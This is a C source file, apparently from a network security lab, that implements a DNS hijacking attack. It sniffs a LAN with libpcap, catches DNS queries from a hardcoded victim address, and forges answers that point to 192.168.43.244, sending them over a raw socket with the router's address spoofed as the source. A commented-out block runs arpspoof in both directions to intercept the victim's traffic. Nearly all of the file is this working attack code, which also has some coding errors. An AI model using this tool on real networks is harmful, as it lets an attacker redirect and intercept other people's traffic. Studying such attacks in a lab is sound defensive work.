/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */



#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>

#include "header.h"



#include "dns_hijack.h"
#include "header.h"
#include "dns.h"


#define VICTIM_IP "192.168.43.129"
#define ROUTER_IP "192.168.43.1"

#define PAYLOAD_SIZE 4096


//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;


int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;


	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	printf("Handle created\n");

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	//if (pcap_can_set_rfmon(handle)==1){
		//if (pcap_set_rfmon(handle, 1))
			//pcap_perror(handle,"Error while setting monitor mode");
	//}

	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

    printf("Promiscuous mode set\n");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);


	//BEGIN_SOLUTION
	/*
	//	char filter_exp[] = "host 192.168.1.100";
	char filter_exp[] = "udp && (dst port 53)";
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp;

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	*/

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	// printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}

    /*
	printf("Setting up arpspoof\n");
	char command[512];
	sprintf(command, "gnome-terminal -e 'sudo arpspoof -i %s -t %s %s' &", dev_name, ROUTER_IP, VICTIM_IP);
    system(command);
	sprintf(command, "gnome-terminal -e 'sudo arpspoof -i %s -t %s %s' &", dev_name, VICTIM_IP, ROUTER_IP);
	system(command);
	*/

	//Put the device in sniff loop
	printf("Begin sniffing\n");
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return 0;

}

void send_raw_packet(char *dest_ip, int dest_port, char *source_ip, int source_port, char* payload, int len) {
    printf("Entered function\n");
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(fd < 0)
	{
		perror("Error creating raw socket");
		return 1;
	}

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(fd < 0)
	{
		perror("Error setting sockopt");
		return 1;
	}

	char packet[65536], *data;
	memset(packet, 0, 65536);

	// strcpy(payload, "Hello world");

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//UDP header pointer
	struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_udp_header psh; //pseudo header

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	//fill the data section
	memcpy(data, payload, len);

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dest_port);
	// sin.sin_addr.s_addr = ;
	inet_pton(AF_INET, dest_ip, &sin.sin_addr);


	// Filling the IP header
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + len;
    iph->id = htonl(66854);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    // Calculating the IP header checksum
    iph->check = checksum((unsigned short *) packet, iph->tot_len);


	// Filling the UDP header
    udph->check = 0;
    udph->dest = htons(dest_port);
    udph->len = htons(sizeof(struct udphdr) + len); // htons(sizeof(struct udphdr));
    udph->source = htons(source_port);

    // Calculating the UDP header checksum
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + len);
    char *pseudo_packet;
    int pseudo_size = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + len;
    pseudo_packet = malloc(pseudo_size);
    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_udp_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_udp_header), udph, sizeof(struct udphdr) + len);
    udph->check = checksum((unsigned short *) pseudo_packet, pseudo_size);


	// Sending the packet
	if(sendto(fd, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) == -1) {
	    fprintf(stderr, "Error, unable to send the packet\n");
	} else {
        printf("Packet sent successfully !\n");
	}

    printf("This is the packet sent : (len : %d)\n", len);

	free(payload);
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
    // Building the response socket
    // TODO Check if equals -1
	// printf("a packet is received! %d \n", total++);
	int size = header->len;

	//	print_udp_packet(buffer, size);

    //	PrintData(buffer, size);

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

	print_udp_packet((u_char*)in_iphr, size);

	//to keep the DNS information received.
	res_record answers[ANS_SIZE], auth[ANS_SIZE], addit[ANS_SIZE]; // TODO Remove auth and addit ?
	query queries[ANS_SIZE];
	bzero(queries, ANS_SIZE*sizeof(query));
	bzero(answers, ANS_SIZE*sizeof(res_record));
	bzero(auth, ANS_SIZE*sizeof(res_record));
	bzero(addit, ANS_SIZE*sizeof(res_record));

	//the UDP header
	struct udphdr *in_udphdr = (struct udpdr*)(in_iphr + 1);
    // printf("UDP header dest : %i\n", in_udphdr->dest);

	// Filtering DNS packets
	in_addr_t victim_addr = inet_addr(VICTIM_IP);
	// printf("Victim addr : %zu\n", victim_addr);
	// printf("Received addr : %zu\n", in_iphr->saddr);
	if(in_udphdr->dest == htons(53) && in_iphr->saddr == victim_addr) {
	    printf("Received DNS query !\n");

	    // char *payload = (char *) calloc(512, sizeof(char));
	    char *payload = malloc(sizeof(char) * PAYLOAD_SIZE);
	    bzero(payload, PAYLOAD_SIZE);


        //the DNS header
        // dns_header *dnsh = (dns_header*)(udph + 1);
        uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);
        printf("Name : %s\n", dns_buff + 12);

        //	parse the dns query
        // int id = parse_dns_query(dns_buff, queries, answers, auth, addit);



        int buf_pos = 0;

        //begin building the dns header
        memcpy(payload, dns_buff, sizeof(dns_header));
        dns_header *dns = (dns_header*) payload;
        dns->qr = 1;
        dns->ra = 1;
        // dns->qr_count = htons(1);
        dns->an_count = htons(1);

        buf_pos += sizeof(dns_header);

        // query part. copy name, then set A, IN
        uint8_t *query = payload + buf_pos;
        uint8_t *name = dns_buff + sizeof(dns_header);
        int length_name = strlen(name) + 1;
        // just copy from data received
        memcpy(query, name, length_name);
        //build_name_section(query, queries->qname, &length_name);
        query += length_name;
        ((question*)query)->qtype = htons(TYPE_A);
        ((question*)query)->qclass = htons(CLASS_IN);

        buf_pos += length_name + sizeof(question);

        // Now building answer part. Same start for the beginning
        // name
        uint8_t *answer = payload + buf_pos;
        //build_name_section(answer, queries->qname, &length_name);
        memcpy(answer, name, length_name);
        answer += length_name;
        // type and class
        r_element* answer_element = answer;
        answer_element->type = htons(TYPE_A);
        answer_element->_class = htons(CLASS_IN);
        answer_element->ttl = htonl(86400); // a day yay
        answer_element->rdlength = htons(4);

        buf_pos += length_name + 10; // attention ! seulement 10 octets pour sizeof(r_element)

        // and now copy ip
        uint32_t* ip_data = payload + buf_pos;
        inet_pton(AF_INET, "192.168.43.244", ip_data);

        buf_pos += sizeof(uint32_t);

        send_raw_packet("192.168.43.129", ntohs(in_udphdr->source), "192.168.43.1", 53, payload, buf_pos);
	}
}

